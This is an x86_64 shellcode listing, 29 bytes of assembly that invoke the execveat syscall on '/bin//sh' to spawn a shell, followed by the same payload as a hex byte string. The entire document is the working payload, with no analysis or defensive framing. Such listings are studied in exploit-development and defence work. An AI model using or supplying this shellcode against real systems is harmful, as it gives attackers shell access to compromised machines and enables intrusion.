; x86_64 execveat("/bin//sh") 29 bytes shellcode

    push   0x42
    pop    rax
    inc    ah
    cqo
    push   rdx
    mov    rdi, 0x68732f2f6e69622f
    push   rdi
    push   rsp
    pop    rsi
    mov    r8, rdx
    mov    r10, rdx
    syscall

; as data:
; 6a4258fec448995248bf2f62696e2f2f736857545e4989d04989d20f05
